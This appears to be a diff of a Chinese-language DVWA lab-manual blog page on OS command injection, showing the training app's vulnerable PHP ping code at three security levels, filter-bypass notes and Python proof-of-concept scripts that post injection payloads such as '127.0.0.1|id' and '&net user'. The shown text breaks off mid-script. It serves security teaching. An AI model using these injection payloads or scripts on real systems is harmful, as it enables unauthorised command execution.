@@ -502,14 +502,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.4k
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    10 分
                 </div>
                 
 
@@ -553,27 +553,8 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    $target = $_REQUEST[ <span class="hljs-string">'ip'</span> ];<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        $cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        $cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Get input
-    $target = $_REQUEST[ &#39;ip&#39; ];
-
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-        // Windows
-        $cmd = shell_exec( &#39;ping  &#39; . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-    }
-
-    // Feedback for the end user
-    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-}
-
-?&gt; </code></pre>
 <p>​        前端代码没有做任何注入防护。</p>
 <p><strong>漏洞利用</strong>：</p>
 <p><strong>方法一：文本框注入测试</strong></p>
@@ -599,66 +580,8 @@ if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
 </li>
 </ul>
 <p><strong>方法二：自编写POC</strong></p>
-<pre><code class="python"># Version: python3
-# Author: Silence
-# Encoding: utf-8
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Version: python3</span><br><span class="hljs-comment"># Author: Silence</span><br><span class="hljs-comment"># Encoding: utf-8</span><br><br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">injection</span><span class="hljs-params">(addr,headers,payload)</span>:</span><br>    url = <span class="hljs-string">'http://&#123;0&#125;:&#123;1&#125;/dvwa/vulnerabilities/exec/'</span>.format(*addr)<br>    name = payload[<span class="hljs-string">'name'</span>]<br>    pattern = payload[<span class="hljs-string">'pattern'</span>]<br>    <span class="hljs-keyword">for</span> pld <span class="hljs-keyword">in</span> payload[<span class="hljs-string">'payloads'</span>]:<br>        params = &#123;<br>            <span class="hljs-string">'ip'</span> : pld,<br>            <span class="hljs-string">'Submit'</span> : <span class="hljs-string">'Submit'</span><br>        &#125;<br>        response = requests.post(url,params,headers=headers)<br>        <span class="hljs-keyword">if</span> response.ok <span class="hljs-keyword">and</span> re.search(pattern,response.text,re.I):<br>            print(<span class="hljs-string">'+ name:'</span>,name, <span class="hljs-string">',payload:'</span>,pld)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(addr,headers)</span>:</span><br>    payloads = [<br>            &#123;<br>                <span class="hljs-string">'name'</span>:<span class="hljs-string">'id'</span>,<br>                <span class="hljs-string">'pattern'</span>:<span class="hljs-string">r'uid=\d'</span>,<br>                <span class="hljs-string">'payloads'</span>:[<br>                <span class="hljs-string">'127.0.0.1;id;'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;&amp;id'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;id'</span>,<br>                <span class="hljs-string">'127.0.0.1|id'</span>,<br>                <span class="hljs-string">'127.0.0.1||id'</span>,<br>                <span class="hljs-string">'testcmdinjection&amp;id'</span>,<br>                <span class="hljs-string">'testcmdinjection|id'</span>,<br>                <span class="hljs-string">'testcmdinjection||id'</span>,<br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">'name'</span>:<span class="hljs-string">'net user'</span>,<br>            <span class="hljs-string">'pattern'</span>:<span class="hljs-string">r'Administrator'</span>,<br>            <span class="hljs-string">'payloads'</span>:[<br>                <span class="hljs-string">'127.0.0.1&amp;&amp;net user'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;net user'</span>,<br>                <span class="hljs-string">'127.0.0.1|net user'</span>,<br>                <span class="hljs-string">'testcmdinjection&amp;net user'</span>,<br>                <span class="hljs-string">'testcmdinjection|net user'</span>,<br>                <span class="hljs-string">'testcmdinjection||net user'</span>,<br>            ]<br>        &#125;,<br>    ]<br>    <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:<br>        injection(addr,headers,payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    server = (<span class="hljs-string">'124.70.137.227'</span>,<span class="hljs-number">80</span>,)<br>    headers = &#123;<br>        <span class="hljs-string">'Cookie'</span> : <span class="hljs-string">'security=low; PHPSESSID=gqhrhpesfenrmv2veseur4orb6'</span><br>    &#125;<br>    main(server,headers)<br></code></pre></td></tr></table></figure>
 
-import re
-
-import requests
-
-
-def injection(addr,headers,payload):
-    url = &#39;http://{0}:{1}/dvwa/vulnerabilities/exec/&#39;.format(*addr)
-    name = payload[&#39;name&#39;]
-    pattern = payload[&#39;pattern&#39;]
-    for pld in payload[&#39;payloads&#39;]:
-        params = {
-            &#39;ip&#39; : pld,
-            &#39;Submit&#39; : &#39;Submit&#39;
-        }
-        response = requests.post(url,params,headers=headers)
-        if response.ok and re.search(pattern,response.text,re.I):
-            print(&#39;+ name:&#39;,name, &#39;,payload:&#39;,pld)
-
-def main(addr,headers):
-    payloads = [
-            {
-                &#39;name&#39;:&#39;id&#39;,
-                &#39;pattern&#39;:r&#39;uid=\d&#39;,
-                &#39;payloads&#39;:[
-                &#39;127.0.0.1;id;&#39;,
-                &#39;127.0.0.1&amp;&amp;id&#39;,
-                &#39;127.0.0.1&amp;id&#39;,
-                &#39;127.0.0.1|id&#39;,
-                &#39;127.0.0.1||id&#39;,
-                &#39;testcmdinjection&amp;id&#39;,
-                &#39;testcmdinjection|id&#39;,
-                &#39;testcmdinjection||id&#39;,
-            ]
-        },
-        {
-            &#39;name&#39;:&#39;net user&#39;,
-            &#39;pattern&#39;:r&#39;Administrator&#39;,
-            &#39;payloads&#39;:[
-                &#39;127.0.0.1&amp;&amp;net user&#39;,
-                &#39;127.0.0.1&amp;net user&#39;,
-                &#39;127.0.0.1|net user&#39;,
-                &#39;testcmdinjection&amp;net user&#39;,
-                &#39;testcmdinjection|net user&#39;,
-                &#39;testcmdinjection||net user&#39;,
-            ]
-        },
-    ]
-    for payload in payloads:
-        injection(addr,headers,payload)
-
-if __name__ == &#39;__main__&#39;:
-    server = (&#39;124.70.137.227&#39;,80,)
-    headers = {
-        &#39;Cookie&#39; : &#39;security=low; PHPSESSID=gqhrhpesfenrmv2veseur4orb6&#39;
-    }
-    main(server,headers)</code></pre>
 <p>使用：</p>
 <ul>
 <li>从浏览器中 <code>copy</code>登陆成功后的 <code>cookie</code>信息</li>
@@ -677,36 +600,8 @@ if __name__ == &#39;__main__&#39;:
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    $target = $_REQUEST[ <span class="hljs-string">'ip'</span> ];<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    $substitutions = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">'&amp;&amp;'</span> =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br>    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        $cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        $cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Get input
-    $target = $_REQUEST[ &#39;ip&#39; ];
-
-    // Set blacklist
-    $substitutions = array(
-        &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,
-        &#39;;&#39;  =&gt; &#39;&#39;,
-    );
-
-    // Remove any of the charactars in the array (blacklist).
-    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
-
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-        // Windows
-        $cmd = shell_exec( &#39;ping  &#39; . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-    }
-
-    // Feedback for the end user
-    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-}
-
-?&gt; </code></pre>
 <ul>
 <li>代码会对输入的<code>&amp;&amp;</code>和<code>;</code>进行过滤，可以使用<code>&amp;;&amp;</code>来绕过</li>
 </ul>
@@ -732,75 +627,8 @@ if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
 </li>
 </ul>
 <p><strong>方式二：自编写POC</strong></p>
-<pre><code class="python"># Version: python3
-# Author: Silence
-# Encoding: utf-8
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Version: python3</span><br><span class="hljs-comment"># Author: Silence</span><br><span class="hljs-comment"># Encoding: utf-8</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> concurrent.futures.thread <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">import</span> requests<br><br>WORKERS = <span class="hljs-number">10</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">injection</span><span class="hljs-params">(data)</span>:</span><br>    addr,headers,payload = data<br>    url = <span class="hljs-string">'http://&#123;0&#125;:&#123;1&#125;/dvwa/vulnerabilities/exec/'</span>.format(*addr)<br>    name = payload[<span class="hljs-string">'name'</span>]<br>    pattern = payload[<span class="hljs-string">'pattern'</span>]<br>    <span class="hljs-keyword">for</span> pld <span class="hljs-keyword">in</span> payload[<span class="hljs-string">'payloads'</span>]:<br>        params = &#123;<br>            <span class="hljs-string">'ip'</span> : pld,<br>            <span class="hljs-string">'Submit'</span> : <span class="hljs-string">'Submit'</span><br>        &#125;<br>        response = requests.post(url,params,headers=headers)<br>        <span class="hljs-keyword">if</span> response.ok <span class="hljs-keyword">and</span> re.search(pattern,response.text,re.I):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>,name,pld<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>,name,<span class="hljs-literal">None</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(addr,headers)</span>:</span><br>    payloads = [<br>            &#123;<br>                <span class="hljs-string">'name'</span>:<span class="hljs-string">'id'</span>,<br>                <span class="hljs-string">'pattern'</span>:<span class="hljs-string">r'uid=\d'</span>,<br>                <span class="hljs-string">'payloads'</span>:[<br>                <span class="hljs-string">'127.0.0.1;id;'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;;&amp;id'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;id'</span>,<br>                <span class="hljs-string">'127.0.0.1|id'</span>,<br>                <span class="hljs-string">'127.0.0.1||id'</span>,<br>                <span class="hljs-string">'testcmdinjection&amp;id'</span>,<br>                <span class="hljs-string">'testcmdinjection|id'</span>,<br>                <span class="hljs-string">'testcmdinjection||id'</span>,<br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">'name'</span>:<span class="hljs-string">'net user'</span>,<br>            <span class="hljs-string">'pattern'</span>:<span class="hljs-string">r'Administrator'</span>,<br>            <span class="hljs-string">'payloads'</span>:[<br>                <span class="hljs-string">'127.0.0.1&amp;;&amp;net user'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;net user'</span>,<br>                <span class="hljs-string">'127.0.0.1|net user'</span>,<br>                <span class="hljs-string">'testcmdinjection&amp;net user'</span>,<br>                <span class="hljs-string">'testcmdinjection|net user'</span>,<br>                <span class="hljs-string">'testcmdinjection||net user'</span>,<br>            ]<br>        &#125;,<br>    ]<br>    datas = itertools.product([addr],[headers],payloads)<br>    executor = ThreadPoolExecutor(max_workers=WORKERS)<br>    <span class="hljs-keyword">for</span> success,name,payload <span class="hljs-keyword">in</span> executor.map(injection,datas):<br>        <span class="hljs-keyword">if</span> success:<br>            print(<span class="hljs-string">'+ name:'</span>,name,<span class="hljs-string">',payload:'</span>,payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    server = (<span class="hljs-string">'124.70.137.227'</span>,<span class="hljs-number">80</span>,)<br>    headers = &#123;<br>        <span class="hljs-string">'Cookie'</span> : <span class="hljs-string">'security=medium; PHPSESSID=gqhrhpesfenrmv2veseur4orb6'</span><br>    &#125;<br>    main(server,headers)<br></code></pre></td></tr></table></figure>
 
-import re
-from concurrent.futures.thread import ThreadPoolExecutor
-import itertools
-
-import requests
-
-WORKERS = 10
-
-
-def injection(data):
-    addr,headers,payload = data
-    url = &#39;http://{0}:{1}/dvwa/vulnerabilities/exec/&#39;.format(*addr)
-    name = payload[&#39;name&#39;]
-    pattern = payload[&#39;pattern&#39;]
-    for pld in payload[&#39;payloads&#39;]:
-        params = {
-            &#39;ip&#39; : pld,
-            &#39;Submit&#39; : &#39;Submit&#39;
-        }
-        response = requests.post(url,params,headers=headers)
-        if response.ok and re.search(pattern,response.text,re.I):
-            return True,name,pld
-    return False,name,None
-
-def main(addr,headers):
-    payloads = [
-            {
-                &#39;name&#39;:&#39;id&#39;,
-                &#39;pattern&#39;:r&#39;uid=\d&#39;,
-                &#39;payloads&#39;:[
-                &#39;127.0.0.1;id;&#39;,
-                &#39;127.0.0.1&amp;;&amp;id&#39;,
-                &#39;127.0.0.1&amp;id&#39;,
-                &#39;127.0.0.1|id&#39;,
-                &#39;127.0.0.1||id&#39;,
-                &#39;testcmdinjection&amp;id&#39;,
-                &#39;testcmdinjection|id&#39;,
-                &#39;testcmdinjection||id&#39;,
-            ]
-        },
-        {
-            &#39;name&#39;:&#39;net user&#39;,
-            &#39;pattern&#39;:r&#39;Administrator&#39;,
-            &#39;payloads&#39;:[
-                &#39;127.0.0.1&amp;;&amp;net user&#39;,
-                &#39;127.0.0.1&amp;net user&#39;,
-                &#39;127.0.0.1|net user&#39;,
-                &#39;testcmdinjection&amp;net user&#39;,
-                &#39;testcmdinjection|net user&#39;,
-                &#39;testcmdinjection||net user&#39;,
-            ]
-        },
-    ]
-    datas = itertools.product([addr],[headers],payloads)
-    executor = ThreadPoolExecutor(max_workers=WORKERS)
-    for success,name,payload in executor.map(injection,datas):
-        if success:
-            print(&#39;+ name:&#39;,name,&#39;,payload:&#39;,payload)
-
-if __name__ == &#39;__main__&#39;:
-    server = (&#39;124.70.137.227&#39;,80,)
-    headers = {
-        &#39;Cookie&#39; : &#39;security=medium; PHPSESSID=gqhrhpesfenrmv2veseur4orb6&#39;
-    }
-    main(server,headers)</code></pre>
 <p>使用：</p>
 <ul>
 <li>从浏览器中 copy 登陆成功后的 cookie 信息</li>
@@ -815,43 +643,8 @@ if __name__ == &#39;__main__&#39;:
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    $target = trim($_REQUEST[ <span class="hljs-string">'ip'</span> ]);<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    $substitutions = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">'&amp;'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'| '</span> =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'-'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'$'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'('</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">')'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'`'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'||'</span> =&gt; <span class="hljs-string">''</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br>    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        $cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        $cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Get input
-    $target = trim($_REQUEST[ &#39;ip&#39; ]);
-
-    // Set blacklist
-    $substitutions = array(
-        &#39;&amp;&#39;  =&gt; &#39;&#39;,
-        &#39;;&#39;  =&gt; &#39;&#39;,
-        &#39;| &#39; =&gt; &#39;&#39;,
-        &#39;-&#39;  =&gt; &#39;&#39;,
-        &#39;$&#39;  =&gt; &#39;&#39;,
-        &#39;(&#39;  =&gt; &#39;&#39;,
-        &#39;)&#39;  =&gt; &#39;&#39;,
-        &#39;`&#39;  =&gt; &#39;&#39;,
-        &#39;||&#39; =&gt; &#39;&#39;,
-    );
-
-    // Remove any of the charactars in the array (blacklist).
-    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
-
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-        // Windows
-        $cmd = shell_exec( &#39;ping  &#39; . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-    }
-
-    // Feedback for the end user
-    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-}
-
-?&gt; </code></pre>
 <ul>
 <li>源码中对大部分关键符号都进行了过滤，但是过滤<code>|</code>时过滤的是:<code>&#39;| &#39;</code></li>
 </ul>
@@ -878,75 +671,8 @@ if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
 </li>
 </ul>
 <p><strong>方法二：自编写POC</strong></p>
-<pre><code class="python"># Version: python3
-# Author: Silence
-# Encoding: utf-8
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Version: python3</span><br><span class="hljs-comment"># Author: Silence</span><br><span class="hljs-comment"># Encoding: utf-8</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> concurrent.futures.thread <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">import</span> requests<br><br>WORKERS = <span class="hljs-number">10</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">injection</span><span class="hljs-params">(data)</span>:</span><br>    addr,headers,payload = data<br>    url = <span class="hljs-string">'http://&#123;0&#125;:&#123;1&#125;/dvwa/vulnerabilities/exec/'</span>.format(*addr)<br>    name = payload[<span class="hljs-string">'name'</span>]<br>    pattern = payload[<span class="hljs-string">'pattern'</span>]<br>    <span class="hljs-keyword">for</span> pld <span class="hljs-keyword">in</span> payload[<span class="hljs-string">'payloads'</span>]:<br>        params = &#123;<br>            <span class="hljs-string">'ip'</span> : pld,<br>            <span class="hljs-string">'Submit'</span> : <span class="hljs-string">'Submit'</span><br>        &#125;<br>        response = requests.post(url,params,headers=headers)<br>        <span class="hljs-keyword">if</span> response.ok <span class="hljs-keyword">and</span> re.search(pattern,response.text,re.I):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>,name,pld<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>,name,<span class="hljs-literal">None</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(addr,headers)</span>:</span><br>    payloads = [<br>            &#123;<br>                <span class="hljs-string">'name'</span>:<span class="hljs-string">'id'</span>,<br>                <span class="hljs-string">'pattern'</span>:<span class="hljs-string">r'uid=\d'</span>,<br>                <span 